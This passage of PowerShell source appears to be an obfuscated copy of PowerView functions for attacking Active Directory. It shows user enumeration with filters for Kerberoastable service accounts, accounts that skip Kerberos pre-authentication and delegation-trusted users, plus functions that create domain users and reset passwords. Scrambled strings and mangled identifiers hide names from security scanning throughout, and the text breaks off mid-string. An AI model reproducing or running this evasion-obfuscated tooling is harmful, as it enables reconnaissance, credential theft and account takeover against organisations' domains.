    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{4}{3}{1}{6}{5}{0}" -f 'nAssignments','dVars','PSUs','eclare','eD','a','MoreTh'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{3}{1}"-f 'ldProc','ss','PSShou','e'}, '')]
    [OutputType({"{2}{0}{1}" -f 'rV','iew.User','Powe'})]
    [OutputType({"{1}{0}{5}{3}{2}{4}" -f'.','PowerView','r.','se','Raw','U'})]
    [CmdletBinding(deFAuLTpAraMEtErsEtNAmE = {"{1}{4}{2}{3}{0}"-f 'n','Allo','a','tio','wDeleg'})]
    Param(
        [Parameter(pOsItION = 0, VAluEfrOMpiPELInE = ${tR`UE}, ValuEFromPIpeLINEbYpROPeRTyNAme = ${T`Rue})]
        [Alias({"{4}{3}{0}{2}{1}" -f'nguish','ame','edN','i','Dist'}, {"{1}{3}{2}{4}{0}" -f 'e','S','Account','am','Nam'}, {"{1}{0}" -f'me','Na'}, {"{3}{1}{2}{0}{4}"-f'stinguished','e','rDi','Memb','Name'}, {"{2}{1}{0}" -f 'rName','embe','M'})]
        [String[]]
        ${id`EnT`iTY},

        [Switch]
        ${s`PN},

        [Switch]
        ${Admi`N`cOU`NT},

        [Parameter(paraMETERsetName = "ALlO`w`D`eLegatIon")]
        [Switch]
        ${a`LlOwDeLE`ga`Ti`on},

        [Parameter(ParaMetERSEtNaMe = "d`ISaLl`o`Wdel`eGat`ion")]
        [Switch]
        ${DIsAllO`wD`eLe`GATiON},

        [Switch]
        ${TR`US`TeDTo`AuTh},

        [Alias({"{4}{5}{1}{2}{0}{3}"-f'ire','NotReq','u','d','KerberosPreau','th'}, {"{2}{1}{0}" -f'eauth','Pr','No'})]
        [Switch]
        ${pre`AUThnoTr`Eq`U`ir`ED},

        [ValidateNotNullOrEmpty()]
        [String]
        ${dom`AIn},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filt','er'})]
        [String]
        ${l`DapFIL`Ter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${Pr`OP`erT`iEs},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}"-f 'th','AD','SPa'})]
        [String]
        ${searC`h`Base},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{3}{0}" -f 'ler','Domain','Contro','l'})]
        [String]
        ${se`RV`Er},

        [ValidateSet({"{1}{0}" -f 'se','Ba'}, {"{1}{0}" -f 'l','OneLeve'}, {"{1}{0}"-f 'ree','Subt'})]
        [String]
        ${s`e`ArcHsCOPE} = ("{1}{0}" -f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`S`ULT`Pagesi`zE} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${S`ERVe`Rt`im`e`LimIT},

        [ValidateSet({"{0}{1}" -f'Da','cl'}, {"{0}{1}"-f 'G','roup'}, {"{1}{0}"-f'e','Non'}, {"{1}{0}"-f 'er','Own'}, {"{0}{1}" -f 'S','acl'})]
        [String]
        ${sECuri`TYMAS`Ks},

        [Switch]
        ${tOMbs`TO`NE},

        [Alias({"{0}{1}{2}"-f 'Ret','urnOn','e'})]
        [Switch]
        ${f`iNDo`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREd`EnT`IaL} =  ${5R0`VK}::"EmP`TY",

        [Switch]
        ${R`Aw}
    )

    DynamicParam {
        ${UACVA`lue`NA`mES} =  ( &("{1}{2}{0}"-f 'le','varI','AB')  ("{0}{1}"-f'0B','z'))."V`AlUE"::("{1}{2}{0}"-f'mes','Ge','tNa').Invoke(${U`ACenuM})
        
        ${UA`Cval`Ue`NAMeS} = ${Ua`C`ValUeNa`MEs} | &("{0}{3}{2}{1}"-f'ForE','t','Objec','ach-') {${_}; "NOT_$_"}
        
        &("{4}{0}{2}{1}{3}" -f 'm','m','icPara','eter','New-Dyna') -Name ("{0}{1}{2}" -f 'U','ACF','ilter') -ValidateSet ${uACva`lUE`NA`MEs} -Type ([array])
    }

    BEGIN {
        ${s`EAr`c`h`eRARGume`Nts} = @{}
        if (${pSboUND`pArA`Me`Te`Rs}[("{1}{0}" -f 'omain','D')]) { ${S`EarC`h`eRar`Gumen`Ts}[("{0}{1}{2}" -f'Dom','a','in')] = ${D`O`Main} }
        if (${P`s`BOUnDparA`mET`E`Rs}[("{3}{2}{0}{1}" -f'tie','s','er','Prop')]) { ${sEA`RchER`Ar`gum`eNtS}[("{1}{0}{2}{3}" -f 'ert','Prop','i','es')] = ${PrOpE`Rt`ies} }
        if (${ps`BOunD`pA`RaMeTERS}[("{2}{0}{1}" -f 'r','chBase','Sea')]) { ${s`EaRcHe`RarG`Um`e`Nts}[("{0}{1}{2}"-f'Search','B','ase')] = ${S`EArCh`Base} }
        if (${PSBo`UN`DPaRAM`eters}[("{1}{2}{0}" -f'er','Se','rv')]) { ${seArcHE`R`ARg`U`meN`TS}[("{0}{1}" -f 'S','erver')] = ${s`eRvER} }
        if (${Psb`ound`pa`RA`MEteRS}[("{2}{0}{1}" -f 'archScop','e','Se')]) { ${s`EarchErA`RG`U`MeNTs}[("{0}{3}{2}{1}"-f'Se','e','Scop','arch')] = ${SE`A`RCHsCOpE} }
        if (${Ps`BoU`NDpar`AmeTE`Rs}[("{4}{1}{0}{3}{2}" -f'ageS','esultP','ze','i','R')]) { ${S`EArChEr`ARg`UmEN`Ts}[("{1}{0}{2}{3}{4}" -f'u','Res','lt','Page','Size')] = ${RE`sulTPA`GeS`i`Ze} }
        if (${PsBo`Und`paRA`metERs}[("{4}{3}{0}{2}{1}"-f'rT','meLimit','i','e','Serv')]) { ${SEAR`c`HE`RAr`GumentS}[("{1}{2}{0}{3}"-f'meLi','Serv','erTi','mit')] = ${SE`RVEr`TI`mELimiT} }
        if (${psBoun`dpA`R`AmET`erS}[("{0}{1}{3}{2}" -f 'S','ecurit','ks','yMas')]) { ${SeA`RcherA`R`G`UME`NTS}[("{2}{1}{0}" -f'Masks','curity','Se')] = ${Se`cURit`Y`MAsks} }
        if (${PSbO`UndPar`AmE`TE`RS}[("{1}{0}"-f 'one','Tombst')]) { ${sEarChe`RARGu`M`ENts}[("{0}{1}" -f 'Tombs','tone')] = ${T`o`MbStoNE} }
        if (${pSbOu`NDPara`M`E`TERs}[("{3}{0}{2}{1}" -f 'rede','tial','n','C')]) { ${Sea`R`CheraR`g`UmEnTs}[("{0}{1}{2}"-f 'Crede','n','tial')] = ${CR`e`De`NtIaL} }
        ${useRsE`Ar`CHEr} = &("{3}{4}{0}{1}{2}"-f'n','S','earcher','Get-Dom','ai') @SearcherArguments
    }

    PROCESS {
        
        if (${p`SbO`UnDpA`R`AmEtE`RS} -and (${ps`BOuN`dpArA`MET`e`Rs}."Co`UNt" -ne 0)) {
            &("{1}{0}{2}{6}{4}{5}{3}" -f 'w-D','Ne','y','meter','ic','Para','nam') -CreateVariables -BoundParameters ${ps`BO`U`NdpAr`AmetERS}
        }

        if (${uSErs`EaR`c`HEr}) {
            ${IdE`Nt`ITyfIL`TER} = ''
            ${fI`lTER} = ''
            ${IdEn`Ti`Ty} | &("{0}{2}{1}" -f 'Wh','-Object','ere') {${_}} | &("{0}{4}{2}{3}{1}" -f'For','ject','ach','-Ob','E') {
                ${ID`eN`TiTyi`NStAN`ce} = ${_}.("{1}{2}{0}" -f'ce','R','epla').Invoke('(', '\28').("{1}{0}"-f 'lace','Rep').Invoke(')', '\29')
                if (${IDEN`T`Ity`INSTaNcE} -match ("{1}{0}"-f '-','^S-1')) {
                    ${iDenti`TYf`Ilt`er} += "(objectsid=$IdentityInstance)"
                }
                elseif (${id`EntITY`i`NSt`ANce} -match ("{0}{1}" -f '^CN','=')) {
                    ${i`dE`NTiTYFiltEr} += "(distinguishedname=$IdentityInstance)"
                    if ((-not ${PS`B`ou`NDPAR`A`MEteRs}[("{2}{1}{0}"-f 'main','o','D')]) -and (-not ${p`SbOUn`DparAmeTE`Rs}[("{2}{1}{0}"-f'rchBase','ea','S')])) {
                        
                        
                        ${ID`E`N`TIty`dOMaIN} = ${ide`NTiTy`In`STanCE}.("{2}{0}{1}"-f'ubS','tring','S').Invoke(${idE`N`TiTYInSTAn`Ce}.("{1}{0}"-f 'ndexOf','I').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                        &("{1}{2}{0}" -f'se','Wri','te-Verbo') ('[G'+'et-Domain'+'U'+'ser] '+'E'+'xtracted'+' '+'do'+'main '+"'$IdentityDomain' "+'fr'+'om '+"'$IdentityInstance'")
                        ${search`eRA`RGUmeN`TS}[("{1}{0}"-f'omain','D')] = ${Id`E`NTIT`YDoMAin}
                        ${u`S`ER`SEaR`cher} = &("{0}{4}{1}{3}{2}"-f 'Get-','a','er','rch','DomainSe') @SearcherArguments
                        if (-not ${uSERs`e`ARC`her}) {
                            &("{1}{2}{0}{3}"-f 'rn','Writ','e-Wa','ing') ('['+'Get-Do'+'mainUs'+'er] '+'Unab'+'l'+'e '+'t'+'o '+'retri'+'ev'+'e'+' '+'do'+'ma'+'in '+'searc'+'her'+' '+'fo'+'r '+"'$IdentityDomain'")
                        }
                    }
                }
                elseif (${IdeNtiTYI`NSTA`N`ce} -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    ${guIDbYt`Es`TriNg} = (([Guid]${ide`N`Ti`TYiNsTAN`ce}).("{1}{0}{3}{2}" -f 't','ToBy','y','eArra').Invoke() | &("{2}{1}{0}" -f 'ct','-Obje','ForEach') { '\' + ${_}.("{0}{2}{1}"-f 'ToStri','g','n').Invoke('X2') }) -join ''
                    ${iD`eNTiT`yfi`L`TER} += "(objectguid=$GuidByteString)"
                }
                elseif (${iDen`TITYI`NS`Ta`NCe}.("{1}{0}{2}" -f'ontain','C','s').Invoke('\')) {
                    ${CO`NveRt`eDIDEN`Tit`Y`INSt`A`NcE} = ${I`D`e`NtItYINs`T`ANce}.("{1}{2}{0}" -f 'lace','R','ep').Invoke('\28', '(').("{0}{1}"-f 'Rep','lace').Invoke('\29', ')') | &("{1}{4}{0}{2}{3}" -f'Na','Conve','m','e','rt-AD') -OutputType ("{0}{2}{1}" -f 'Ca','cal','noni')
                    if (${coNV`Er`T`EdidentITyINst`An`CE}) {
                        ${uSE`R`DO`maIn} = ${CO`NvErTEd`IDe`Ntit`Yi`NstAnCE}.("{1}{0}"-f 'ing','SubStr').Invoke(0, ${C`o`NvERtEDi`D`eNt`i`TyiNSTANCe}.("{2}{0}{1}" -f 'nde','xOf','I').Invoke('/'))
                        ${u`Ser`NaMe} = ${I`de`N`TityiNStAn`cE}.("{1}{0}"-f 'lit','Sp').Invoke('\')[1]
                        ${IdeN`TitYF`ILter} += "(samAccountName=$UserName)"
                        ${SEaRcheRa`Rg`U`M`eNTs}[("{1}{0}{2}"-f'm','Do','ain')] = ${u`s`eR`DOMaIN}
                        &("{1}{2}{0}" -f'ite-Verbose','W','r') ('[G'+'et-'+'D'+'omai'+'nUs'+'er] '+'Extrac'+'t'+'ed '+'domai'+'n'+' '+"'$UserDomain' "+'from'+' '+"'$IdentityInstance'")
                        ${usE`RsEArC`hEr} = &("{0}{3}{2}{1}" -f 'Get-D','er','earch','omainS') @SearcherArguments
                    }
                }
                else {
                    ${idEn`TiTYF`iLT`ER} += "(samAccountName=$IdentityInstance)"
                }
            }

            if (${Identi`T`yfiLTER} -and (${ID`e`Ntityf`iL`TeR}.("{0}{1}"-f 'Tr','im').Invoke() -ne '') ) {
                ${Fi`LtER} += "(|$IdentityFilter)"
            }

            if (${Ps`B`oUnd`Pa`RAMETers}['SPN']) {
                &("{1}{4}{0}{2}{3}" -f'r','Write','b','ose','-Ve') ("{12}{7}{10}{2}{0}{4}{11}{9}{13}{3}{6}{8}{5}{1}"-f'] S','mes','r','r','e','pal na','vi','-Dom','ce princi','non','ainUse','arching for ','[Get','-null se')
                ${FILt`ER} += (("{2}{5}{3}{1}{4}{0}"-f 'e=*)','rinci','(ser','ceP','palNam','vi'))
            }
            if (${PS`BO`UNDPA`RAME`TERs}[("{4}{0}{3}{2}{1}" -f'llowDe','tion','ga','le','A')]) {
                &("{2}{1}{0}"-f 'Verbose','-','Write') ("{3}{6}{9}{1}{4}{8}{5}{7}{0}{2}"-f 'ho can ','U','be delegated','[Get-','ser] ','i','Domai','ng for users w','Search','n')
                
                ${f`iL`Ter} += (("{6}{0}{8}{7}{5}{10}{4}{2}{3}{1}{9}"-f 'r',')','48','574','0','t','(!(use','ountCon','Acc',')','rol:1.2.840.113556.1.4.803:=1'))
            }
            if (${Ps`BoUNdP`Ar`A`METErS}[("{1}{0}{5}{3}{4}{2}" -f 'allow','Dis','ion','e','gat','Del')]) {
                &("{0}{3}{2}{1}" -f'Write-Ve','e','os','rb') ("{5}{13}{11}{16}{1}{17}{9}{8}{12}{14}{10}{6}{4}{3}{15}{0}{2}{7}{18}"-f'r de','n','lega',' no','d','[Get-Do',' an','ti','ers who ',' for us','e','earch','are se','mainUser] S','nsitiv','t trusted fo','i','g','on')
                ${f`ilT`eR} += ("{9}{5}{6}{1}{7}{2}{8}{13}{3}{10}{12}{0}{14}{4}{11}" -f '=','.2.840','355','.4','48','tCont','rol:1','.11','6','(userAccoun','.803','574)',':','.1','10')
            }
            if (${pSb`o`UndpARaMetE`RS}[("{0}{1}{2}"-f'A','dmi','nCount')]) {
                &("{3}{2}{1}{0}{4}"-f 'os','e-Verb','rit','W','e') ("{0}{6}{9}{2}{3}{5}{7}{1}{4}{8}"-f'[','minC','rch','in','ou','g ','Get-DomainUser]','for ad','nt=1',' Sea')
                ${fI`LT`Er} += ("{0}{1}{3}{2}"-f'(ad','mi','ount=1)','nc')
            }
            if (${psBOU`NDPaR`Amete`Rs}[("{0}{2}{3}{1}"-f'TrustedTo','h','A','ut')]) {
                &("{1}{0}{2}"-f'te-Ve','Wri','rbose') ("{15}{6}{14}{8}{2}{17}{16}{11}{9}{5}{0}{12}{10}{4}{13}{3}{7}{1}"-f'ust','er principals','r',' ot','ate','r','omain','h','r] Searching for use','re t','entic','a','ed to auth',' for','Use','[Get-D',' that ','s')
                ${fI`Lt`er} += ("{2}{1}{3}{4}{0}{5}" -f 'te','s-','(msd','al','lowedtodelega','to=*)')
            }
            if (${P`sB`OUNDPARAM`ET`Ers}[("{0}{1}{2}{3}" -f 'P','rea','uthNo','tRequired')]) {
                &("{0}{3}{1}{2}" -f 'Wri','-Verbos','e','te') ("{15}{1}{2}{14}{20}{4}{17}{9}{7}{22}{10}{8}{21}{3}{11}{13}{18}{19}{12}{16}{0}{5}{6}"-f'n','et','-',' not ','r] ','tic','ate',' ','t','or','ser accounts tha','requ','r','ire','Dom','[G','eauthe','Searching f',' ke','rberos p','ainUse',' do','u')
                ${fi`l`TER} += (("{12}{4}{6}{7}{11}{8}{9}{0}{13}{1}{15}{3}{2}{14}{5}{10}"-f'2.840.','5','.4.','1','Account','3:=41943','C','on','rol:1','.','04)','t','(user','113','80','56.'))
            }
            if (${psbOu`N`dpa`RAMET`eRS}[("{1}{0}{2}" -f 'il','LDAPF','ter')]) {
                &("{3}{2}{0}{1}" -f'b','ose','Ver','Write-') ('[Get-Dom'+'a'+'i'+'nU'+'ser]'+' '+'Usin'+'g '+'addi'+'ti'+'onal'+' '+'LDA'+'P '+'f'+'ilter: '+"$LDAPFilter")
                ${f`iLter} += "$LDAPFilter"
            }

            
            ${U`A`C`FiLtER} | &("{0}{1}{2}"-f'Where','-Ob','ject') {${_}} | &("{1}{4}{0}{2}{3}"-f 'ch','Fo','-','Object','rEa') {
                if (${_} -match ("{0}{1}" -f'N','OT_.*')) {
                    ${UaCfI`e`Ld} = ${_}.("{2}{1}{0}"-f 'string','ub','S').Invoke(4)
                    ${UAcV`ALUE} = [Int](${Uac`En`UM}::${u`ACfiE`LD})
                    ${FIl`Ter} += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    ${u`ACV`AlUe} = [Int](${uA`Ce`NUm}::${_})
                    ${fIl`Ter} += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            ${userS`EaRc`heR}."fiL`TeR" = "(&(samAccountType=805306368)$Filter)"
            &("{3}{2}{0}{1}"-f'b','ose','Ver','Write-') "[Get-DomainUser] filter string: $($UserSearcher.filter) "

            if (${PsbOuNdP`ARa`mET`Ers}[("{1}{2}{0}" -f'e','Fi','ndOn')]) { ${R`es`ULTS} = ${u`SerSeaRCH`Er}.("{1}{0}"-f 'One','Find').Invoke() }
            else { ${r`esultS} = ${Us`Er`sEar`C`heR}.("{1}{0}"-f'All','Find').Invoke() }
            ${r`esULtS} | &("{1}{0}{3}{2}"-f'-O','Where','t','bjec') {${_}} | &("{1}{0}{2}" -f 'orEach','F','-Object') {
                if (${pSBo`UN`dpa`RAmETers}['Raw']) {
                    
                    ${u`SEr} = ${_}
                    ${Us`Er}."pso`Bj`ecT"."typeNa`mEs".("{0}{1}" -f'In','sert').Invoke(0, ("{2}{1}{4}{3}{0}"-f'Raw','wer','Po','User.','View.'))
                }
                else {
                    ${Us`eR} = &("{2}{0}{1}{3}" -f'PPrope','r','Convert-LDA','ty') -Properties ${_}."pR`opE`RT`Ies"
                    ${US`Er}."PSobJE`ct"."ty`pEnAM`es".("{0}{1}"-f'I','nsert').Invoke(0, ("{0}{1}{2}" -f 'Power','View.','User'))
                }
                ${U`Ser}
            }
            if (${r`eS`ULTs}) {
                try { ${reS`U`LTs}.("{1}{0}"-f 'ose','disp').Invoke() }
                catch {
                    &("{1}{0}{2}"-f 'e-V','Writ','erbose') ('[Ge'+'t'+'-DomainUse'+'r] '+'Err'+'or'+' '+'disp'+'o'+'sing '+'of'+' '+'the'+' '+'R'+'esu'+'lts '+'objec'+'t'+': '+"$_")
                }
            }
            ${u`sErS`EARCH`ER}.("{1}{0}" -f 'ispose','d').Invoke()
        }
    }
}


function nEw-domaI`N`USEr {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{3}{10}{5}{6}{9}{1}{8}{7}{4}{0}" -f 'ns','eChangin','PSU','seSh','o','P','rocess','uncti','gF','ForStat','ould'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{4}{3}{0}{2}{1}" -f 'P','ss','roce','uld','PSSho'}, '')]
    [OutputType({"{0}{10}{3}{1}{6}{14}{7}{5}{8}{11}{9}{13}{2}{12}{4}" -f 'D','yS','r','or','cipal','ntMan','ervices','Accou','agement.','e','irect','Us','in','rP','.'})]
    Param(
        [Parameter(mANDatoRy = ${t`RuE})]
        [ValidateLength(0, 256)]
        [String]
        ${samAC`coun`TNa`me},

        [Parameter(maNdaTOrY = ${T`RUE})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}{2}"-f 's','Pas','word'})]
        [Security.SecureString]
        ${Accou`NTpAS`SwoRd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${n`AmE},

        [ValidateNotNullOrEmpty()]
        [String]
        ${di`S`playnAMe},

        [ValidateNotNullOrEmpty()]
        [String]
        ${DeSCR`iPtI`On},

        [ValidateNotNullOrEmpty()]
        [String]
        ${d`OM`AIn},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CR`Edent`IaL} =   (  &("{1}{0}" -f'arIaBLe','V') ('5r'+'0Vk') )."vA`LuE"::"Em`pTy"
    )

    ${c`O`Nt`eXtA`RGUMen`TS} = @{
        ("{0}{1}{2}"-f'Ident','i','ty') = ${sam`A`cCouN`TNaME}
    }
    if (${psboU`Nd`paraME`TeRs}[("{0}{1}" -f 'Domai','n')]) { ${co`NtExtAR`gUMe`Nts}[("{0}{1}{2}"-f 'Dom','a','in')] = ${dom`AIn} }
    if (${P`SBOU`N`D`PaR`AmeTErS}[("{2}{0}{1}"-f 'ia','l','Credent')]) { ${conTexTaR`G`UMEN`Ts}[("{0}{1}{3}{2}" -f 'Cr','e','al','denti')] = ${C`R`EDentiaL} }
    ${cO`NTE`XT} = &("{1}{2}{3}{4}{0}" -f'ntext','Ge','t-','PrincipalC','o') @ContextArguments

    if (${conT`E`xT}) {
        ${uS`ER} = &("{2}{1}{0}" -f't','ec','New-Obj') -TypeName ("{6}{9}{2}{11}{1}{10}{12}{0}{5}{8}{4}{13}{7}{3}" -f'ccou','rectory','tem.D','cipal','Use','nt','S','in','Management.','ys','Service','i','s.A','rPr') -ArgumentList (${coNtE`XT}."cO`NTe`xT")

        
        ${u`SEr}."SAma`ccOuntn`AMe" = ${c`ONte`Xt}."I`denTI`Ty"
        ${T`EM`pCreD} = &("{0}{2}{1}"-f'New-','bject','O') ("{9}{8}{6}{4}{1}{7}{2}{3}{0}{5}" -f 't','m','ed','en','.Auto','ial','agement','ation.PSCr','an','System.M')('a', ${Ac`cOunTPASS`WORd})
        ${Us`Er}.("{1}{0}{2}" -f'wo','SetPass','rd').Invoke(${Te`MpC`RED}.("{2}{3}{4}{1}{0}"-f'ential','ed','GetN','etwork','Cr').Invoke()."PA`SSwORD")
        ${U`SER}."e`NaBLed" = ${t`RUE}
        ${u`SEr}."pASS`wO`RdN`o`T`REquiRed" = ${Fa`L`sE}

        if (${pSb`OU`NdpA`R`AmEteRS}[("{1}{0}" -f'me','Na')]) {
            ${uS`er}."na`me" = ${nA`mE}
        }
        else {
            ${u`sER}."N`AMe" = ${Co`NT`EXt}."idE`Nti`TY"
        }
        if (${PsB`ouNd`pAr`AM`ETERS}[("{3}{0}{2}{1}" -f'splayN','e','am','Di')]) {
            ${Us`Er}."d`isplAY`N`AMe" = ${Dis`PLAy`NAME}
        }
        else {
            ${US`eR}."d`isPl`AYN`AMe" = ${coNtE`xT}."IDE`N`TiTy"
        }

        if (${p`SboundPA`RaM`et`eRS}[("{2}{0}{1}"-f's','cription','De')]) {
            ${uS`ER}."dEsCRip`Ti`ON" = ${D`Es`Cr`iPtIoN}
        }

        &("{2}{1}{0}" -f'bose','Ver','Write-') ('[New'+'-Dom'+'ainUs'+'er'+'] '+'A'+'tt'+'empti'+'ng '+'t'+'o '+'cre'+'ate '+'use'+'r '+"'$SamAccountName'")
        try {
            ${NU`LL} = ${u`Ser}.("{1}{0}" -f 'e','Sav').Invoke()
            &("{1}{2}{3}{4}{0}" -f'se','Wri','t','e-Verb','o') ('['+'New-'+'Dom'+'ain'+'User] '+'User'+' '+"'$SamAccountName' "+'succe'+'ssful'+'ly '+'creat'+'ed')
            ${u`sER}
        }
        catch {
            &("{3}{1}{2}{0}"-f 'g','rit','e-Warnin','W') ('[New-Domain'+'Use'+'r'+'] '+'Erro'+'r'+' '+'creatin'+'g'+' '+'user'+' '+"'$SamAccountName' "+': '+"$_")
        }
    }
}


function S`ET`-do`mA`iNUsERPAssWorD {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{7}{4}{0}{1}{3}{2}{9}{5}{8}{6}" -f 'Should','Pr','orStateCha','ocessF','Use','gFunc','ions','PS','t','ngin'}, '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{1}{2}{3}{0}"-f 's','PS','ShouldPro','ces'}, '')]
    [OutputType({"{4}{0}{6}{7}{1}{5}{2}{3}" -f 'oryS','s.AccountMa','rPr','incipal','Direct','nagement.Use','ervic','e'})]
    Param(
        [Parameter(pOsiTION = 0, mANdatorY = ${TR`UE})]
        [Alias({"{0}{1}"-f'UserN','ame'}, {"{0}{3}{2}{1}"-f'U','dentity','erI','s'}, {"{1}{0}" -f 'er','Us'})]
        [String]
        ${Iden`T`Ity},

        [Parameter(maNdAToRY = ${t`RUe})]
        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}" -f 'Passwor','d'})]
        [Security.SecureString]
        ${acC`OUNtpA`Ss`WOrd},

        [ValidateNotNullOrEmpty()]
        [String]
        ${do`Ma`in},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`ed`En`TiaL} =   ( &("{2}{0}{1}"-f'Ab','le','GET-varI') ("5R0v"+"k")  -vAlUeONL  )::"em`Pty"
    )

    ${c`ONTe`XtArgUmeN`TS} = @{ ("{0}{1}"-f 'Id','entity') = ${ID`e`NtiTy} }
    if (${PSb`ou`NDp`A`Rame`TeRs}[("{0}{1}"-f 'Dom','ain')]) { ${Con`T`E`Xta`RgUM`eNtS}[("{1}{0}" -f 'omain','D')] = ${doma`in} }
    if (${pSB`ouNdP`AR`AM`eters}[("{1}{2}{0}" -f'l','C','redentia')]) { ${cOnt`eXt`AR`GUMEnts}[("{0}{2}{1}"-f'Credent','l','ia')] = ${CrEde`NT`iAl} }
    ${cOnT`e`xT} = &("{0}{1}{3}{2}{4}{5}{6}" -f 'Ge','t-P','c','rin','ipa','lCon','text') @ContextArguments

    if (${coNtE`xT}) {
        ${U`ser} = [System.DirectoryServices.AccountManagement.UserPrincipal]::("{3}{0}{4}{2}{1}"-f 'e','y','it','FindById','nt').Invoke(${C`O`NteXT}."coN`Text", ${idE`N`Tity})

        if (${Us`Er}) {
            &("{1}{0}{2}" -f 'rbo','Write-Ve','se') ('[Set-D'+'oma'+'inUse'+'rP'+'a'+'ssw'+'ord] '+'A'+'tte'+'mpting '+'t'+'o '+'se'+'t '+'th'+'e '+'p'+'a'+'ssword '+'fo'+'r '+'use'+'r '+"'$Identity'")
            try {
                ${t`em`pcReD} = &("{1}{0}{2}" -f'-','New','Object') ("{2}{4}{5}{8}{7}{0}{6}{9}{3}{10}{1}"-f'nt.Automa','tial','Syst','n.','em.M','an','t','geme','a','io','PSCreden')('a', ${ac`cO`UNtPAsSwORd})
                ${us`er}.("{2}{1}{0}" -f'word','Pass','Set').Invoke(${te`M`pc`REd}.("{1}{4}{3}{2}{5}{0}" -f 'al','GetNe','ede','Cr','twork','nti').Invoke()."PA`ss`WORD")

                ${n`UlL} = ${u`sEr}.("{1}{0}"-f'e','Sav').Invoke()
                &("{2}{3}{0}{4}{1}" -f 'Ver','e','Write','-','bos') ('[S'+'e'+'t-Domain'+'User'+'Pa'+'ssw'+'or'+'d] '+'P'+'assword '+'f'+'or '+'us'+'er '+"'$Identity' "+'successf'+'ull'+'y'+' '+'re'+'set')
            }
            catch {
                &("{2}{0}{3}{1}" -f 'ite-W','g','Wr','arnin') ('[S'+'et-Dom'+'ai'+'nUserPass'+'wo'+'rd'+']'+' '+'Err'+'or'+' '+'settin'+'g '+'passw'+'ord'+' '+'for'+' '+'u'+'ser '+"'$Identity' "+': '+"$_")
            }
        }
        else {
            &("{1}{0}{2}" -f'rite-','W','Warning') ('['+'Set-'+'Doma'+'inUserP'+'assword] '+'Unabl'+'e'+' '+'to'+' '+'fi'+'nd '+'us'+'er '+"'$Identity'")
        }
    }
}


function gEt`-DomAinuSEr`eV`Ent {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{0}{3}{1}{2}"-f 'PS','u','ldProcess','Sho'}, '')]
    [OutputType({"{1}{0}{4}{3}{2}"-f'er','Pow','Event','on','View.Log'})]
    [OutputType({"{6}{5}{0}{1}{4}{3}{2}"-f'View.Explici','tCred','vent','ialLogonE','ent','er','Pow'})]
    [CmdletBinding()]
    Param(
        [Parameter(PosiTIon = 0, VaLUefrOmpIPELInE = ${tr`Ue}, ValuefRomPIPelInEBypRoPeRtYname = ${t`RUE})]
        [Alias({"{1}{0}{2}"-f'shos','dn','tname'}, {"{1}{0}{2}" -f 'ostNa','H','me'}, {"{0}{1}"-f'n','ame'})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${C`o`MpUTER`NamE} = ${enV:CO`Mp`UtE`R`NaME},

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${s`T`ArTtIMe} =   ( &("{0}{2}{1}"-f'V','bLE','ARiA') ('r4F'+'6') )."v`AluE"::"N`oW".("{0}{1}{2}"-f 'Add','Day','s').Invoke(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        ${E`Nd`TIMe} =   ${r4`F6}::"N`ow",

        [ValidateRange(1, 1000000)]
        [Int]
        ${mAx`EvE`N`Ts} = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CRE`dEnT`I`AL} =   (&("{0}{2}{1}"-f 'V','e','aRiaBL') ("{0}{1}"-f '5','r0vK'))."V`AlUE"::"eM`PTy"
    )

    BEGIN {
        
        ${XPAt`h`FI`ltEr} = ((('V'+'t3
'+'<Q'+'ueryL'+'ist>
 ')-CrEPLAce  ([ChAr]86+[ChAr]116+[ChAr]51),[ChAr]34)+' '+' '+' '+'<Q'+'uery '+(('I'+'d=S'+'7n0S'+'7n ') -rePLAcE ([chAr]83+[chAr]55+[chAr]110),[chAr]34)+('Path={'+'0}Secu'+'rity{0'+'}>'+'

 ')  -f  [ChAr]34+' '+' '+' '+' '+' '+' '+' '+'<'+'!-- '+'L'+'ogon '+'ev'+'ent'+'s '+'-'+'->
 '+' '+' '+' '+' '+' '+' '+' '+'<Sel'+'ec'+'t '+('Pat'+'h={'+'0'+'}Security{0}>'+'
 ')  -F [CHAR]34+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'*['+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'ystem'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'Pro'+'vider'+'[
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('@Na'+'me=DTmM'+'i'+'cros'+'oft'+'-'+'Wind'+'ows-S'+'e'+'c'+'ur'+'ity-'+'Auditing'+'D'+'Tm
